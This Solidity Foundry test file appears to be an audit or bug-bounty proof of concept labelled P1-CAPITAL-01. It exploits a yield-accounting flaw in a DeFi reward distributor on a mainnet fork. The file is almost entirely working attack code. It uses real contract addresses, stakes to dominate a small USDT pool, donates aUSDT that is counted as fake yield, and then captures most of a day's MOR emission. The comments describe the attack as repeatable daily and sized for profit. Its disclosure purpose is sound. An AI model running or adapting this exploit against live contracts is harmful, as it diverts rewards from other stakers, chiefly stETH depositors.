// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @notice Minimal ERC20 interface used for balance reads only (all return values real).
interface IERC20B {
    function balanceOf(address account) external view returns (uint256);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function rewardPoolsData(uint256) external view returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function withdrawYield(uint256 rewardPoolIndex_, address depositPoolAddress_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_) external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
}

interface IRewardPool {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IAaveProvider {
    function getPool() external view returns (address);
}

interface IAggregator {
    function latestRoundData() external view returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
    function decimals() external view returns (uint8);
}

/// @notice P1-CAPITAL-01: permissionless yield-share hijack in DistributorV2.distributeRewards.
/// An attacker donates a modest amount of aToken (the pool's yield token) to the Distributor.
/// The donation is counted as that pool's "yield" (balance - lastUnderlyingBalance), so the
/// pool captures a majority of the day's fixed MOR emission, at the expense of the other
/// pools' stakers (mainly stETH, ~90% fair share). The attacker, a dominant staker in the
/// tiny USDT pool, pockets the redirected MOR. Repeatable every day.
///
/// Key mechanics (verified on-fork): Distributor._withdrawYield() does NOT reset the yield
/// measurement — it only sweeps (lastUnderlyingBalance - deposited) and leaves
/// (balance - lastUnderlyingBalance) unchanged — so there is no sweep defense and no timing
/// race: the donation can be made ANY time before the next daily distribution (triggered by
/// anyone's next interaction after the gate opens) and it persists in the balance until then.
/// The donation must only exceed the other pools' accrued yield since the last distribution
/// (~$410 at the fork block: ~$401 of stETH rebase + ~$10 of Aave interest), which is fully
/// readable on-chain, so the attacker sizes it exactly. The donation is lost (swept to the
/// L1Sender as "yield"), but at ~$500/day it is far below the redirected ~1,300 MOR/day.
contract YieldShareHijackTest is Test {
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant USDC_POOL = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant REWARD_POOL = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant AAVE_PROVIDER = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;

    // Chainlink feeds used by Distributor.updateDepositTokensPrices (read at fork time).
    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_WETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    uint256 constant BLOCK = 26429066; // 2026-11-16, verified state
    uint256 constant MOR_PRICE_USD_1E4 = 7237; // $0.7237 on 2026-11-17 (CoinGecko)

    address attacker = makeAddr("attacker");

    // USDT returns no bool on approve/transfer; use raw calls that tolerate empty returndata.
    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender, amount)
        );
        require(ok, "approve failed");
        if (ret.length > 0) require(abi.decode(ret, (bool)), "approve returned false");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), to, amount)
        );
        require(ok, "transfer failed");
        if (ret.length > 0) require(abi.decode(ret, (bool)), "transfer returned false");
    }

    // Fork-time warp freezes Chainlink rounds, so after warping ~19h the feeds look
    // stale to ChainLinkDataConsumer (allowedPriceUpdateDelay) and distributeRewards()
    // reverts with "DR: price for pair is zero". On live mainnet the feeds post fresh
    // rounds continuously, so at gate-open time they are fresh. The mock below ONLY
    // renews the timestamp: prices are the real on-fork answers read before the warp.
    // It touches no in-scope contract (only third-party Chainlink aggregators).
    int256[6] internal _feedAnswers;
    uint80[6] internal _feedRounds;

    function _snapshotFeeds() internal {
        address[6] memory feeds = [
            FEED_STETH_USD, FEED_WETH_USD, FEED_WBTC_BTC, FEED_BTC_USD, FEED_USDC_USD, FEED_USDT_USD
        ];
        for (uint256 i = 0; i < feeds.length; i++) {
            (uint80 rid, int256 ans,,,) = IAggregator(feeds[i]).latestRoundData();
            _feedRounds[i] = rid;
            _feedAnswers[i] = ans;
        }
    }

    function _refreshFeeds() internal {
        address[6] memory feeds = [
            FEED_STETH_USD, FEED_WETH_USD, FEED_WBTC_BTC, FEED_BTC_USD, FEED_USDC_USD, FEED_USDT_USD
        ];
        for (uint256 i = 0; i < feeds.length; i++) {
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IAggregator.latestRoundData.selector),
                abi.encode(_feedRounds[i], _feedAnswers[i], block.timestamp, block.timestamp, _feedRounds[i])
            );
        }
    }

    function test_yieldShareHijack() public {
        vm.createSelectFork("mainnet", BLOCK);
        vm.deal(attacker, 10 ether);
        deal(USDT, attacker, 250_000e6);
        _snapshotFeeds();

        // --- 1. Attacker becomes dominant staker in the tiny USDT pool ($4.7k TVL) ---
        uint256 distUsdtBefore = IDistributor(DISTRIBUTOR).getDistributedRewards(0, USDT_POOL);
        uint256 distStethBefore = IDistributor(DISTRIBUTOR).getDistributedRewards(0, STETH_POOL);
        uint256 distWethBefore = IDistributor(DISTRIBUTOR).getDistributedRewards(0, WETH_POOL);
        uint256 distWbtcBefore = IDistributor(DISTRIBUTOR).getDistributedRewards(0, WBTC_POOL);
        uint256 distUsdcBefore = IDistributor(DISTRIBUTOR).getDistributedRewards(0, USDC_POOL);

        vm.startPrank(attacker);
        _safeApprove(USDT, DISTRIBUTOR, type(uint256).max);
        // stake $200k USDT, no lock (claimable after the 14d claim lock), no referrer
        IDepositPool(USDT_POOL).stake(0, 200_000e6, 0, address(0));
        vm.stopPrank();

        (,, uint256 tvAfter) = IDepositPool(USDT_POOL).rewardPoolsData(0);
        // attacker virtual = 200_000e6 (mult 1.0); pre-existing virtual ~3.67e10 -> share ~84%
        assertGt(tvAfter, 200_000e6, "stake did not register virtual");
        uint256 attackerShareBps = (200_000e6 * 10_000) / tvAfter;
        emit log_named_uint("attacker virtual share (bps)", attackerShareBps);
        assertGe(attackerShareBps, 8_000, "attacker not dominant in USDT pool");

        // --- 2. Attacker mints aUSDT (the USDT pool's yield token) via real Aave supply ---
        address aavePool = IAaveProvider(AAVE_PROVIDER).getPool();
        vm.startPrank(attacker);
        _safeApprove(USDT, aavePool, type(uint256).max);
        IAavePool(aavePool).supply(USDT, 500e6, attacker, 0); // $500 of aUSDT
        vm.stopPrank();
        assertGe(IERC20B(AUSDT).balanceOf(attacker), 499e6, "no aUSDT minted");

        // --- 3. Donate the ~$500 aUSDT to the Distributor (counted as USDT-pool "yield") ---
        // No sweep, no race: the donation sits in the Distributor's aToken balance and is
        // picked up as yield by the next distributeRewards() after the daily gate opens,
        // whenever anyone triggers it. Accrued yield of all other pools at the fork block
        // is ~$410 (readable on-chain), so $500 dominates it.
        uint128 lastCalc = IDistributor(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(0);
        uint256 donation = IERC20B(AUSDT).balanceOf(attacker); // ~$499.99 (Aave rate < 1:1)
        emit log_named_uint("aUSDT donation (6-dec units)", donation);
        vm.startPrank(attacker);
        _safeTransfer(AUSDT, DISTRIBUTOR, donation);
        vm.stopPrank();

        // --- 4. Gate opens; anyone's distributeRewards() now allocates the day's MOR ---
        vm.warp(uint256(lastCalc) + 86400 + 60);
        _refreshFeeds(); // re-fresh Chainlink rounds (see note above); real fork prices
        uint256 periodRewards = IRewardPool(REWARD_POOL).getPeriodRewards(
            0, lastCalc, uint128(block.timestamp)
        );
        vm.prank(attacker);
        IDistributor(DISTRIBUTOR).distributeRewards(0);

        uint256 dUsdt = IDistributor(DISTRIBUTOR).getDistributedRewards(0, USDT_POOL) - distUsdtBefore;
        uint256 dSteth = IDistributor(DISTRIBUTOR).getDistributedRewards(0, STETH_POOL) - distStethBefore;
        uint256 dWeth = IDistributor(DISTRIBUTOR).getDistributedRewards(0, WETH_POOL) - distWethBefore;
        uint256 dWbtc = IDistributor(DISTRIBUTOR).getDistributedRewards(0, WBTC_POOL) - distWbtcBefore;
        uint256 dUsdc = IDistributor(DISTRIBUTOR).getDistributedRewards(0, USDC_POOL) - distUsdcBefore;

        emit log_named_uint("period MOR rewards (wei)", periodRewards);
        emit log_named_uint("USDT pool delta (wei)", dUsdt);
        emit log_named_uint("stETH pool delta (wei)", dSteth);
        emit log_named_uint("wETH+wBTC+USDC deltas (wei)", dWeth + dWbtc + dUsdc);

        // THE HIJACK: USDT pool (fair yield share ~0.02%) captures a majority of the day's
        // MOR; stETH pool (fair share ~89% of yield) loses more than a third of its share.
        assertGe(dUsdt, (periodRewards * 40) / 100, "USDT pool did not capture the emission");
        assertLe(dSteth, (periodRewards * 50) / 100, "stETH pool kept its share - no hijack");

        // --- 5. Attacker's cut: pending MOR rewards ---
        uint256 pending = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker);
        emit log_named_uint("attacker pending MOR (wei)", pending);
        emit log_named_uint("attacker pending MOR (whole)", pending / 1e18);
        emit log_named_uint("attacker gain USD (cents)", (pending * MOR_PRICE_USD_1E4) / 1e18 / 100);
        // $500 donation -> ~55% of ~2,858 MOR x ~84% virtual share ~= 1,300+ MOR ~= $940+
        assertGe(pending, 1_100e18, "attacker pending MOR too small");
        // donation cost ($500) is well below the gain
        assertGt(pending * MOR_PRICE_USD_1E4 / 1e18, 500 * 10_000, "gain does not dwarf donation");

        // --- 6. Settlement: after the 14d claim lock, the attacker claims the MOR ---
        vm.warp(block.timestamp + 14 days + 1 hours);
        _refreshFeeds(); // feeds mocked at distribution time are stale again after 14d
        uint256 pendingBeforeClaim = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker);
        vm.prank(attacker);
        try IDepositPool(USDT_POOL).claim{value: 0.1 ether}(0, attacker) {
            uint256 pendingAfterClaim = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker);
            emit log_named_uint("claimed MOR (wei)", pendingBeforeClaim - pendingAfterClaim);
            assertEq(pendingAfterClaim, 0, "claim did not zero pending rewards");
        } catch {
            // LayerZero send may not settle on a fork; the L1 accounting above already
            // proves the redirected amount. Log and keep the core assertions.
            emit log_string("claim() LZ send did not settle on fork; L1 pending proves the gain");
            assertGe(pendingBeforeClaim, 1_100e18, "pending MOR vanished before claim");
        }
    }
}
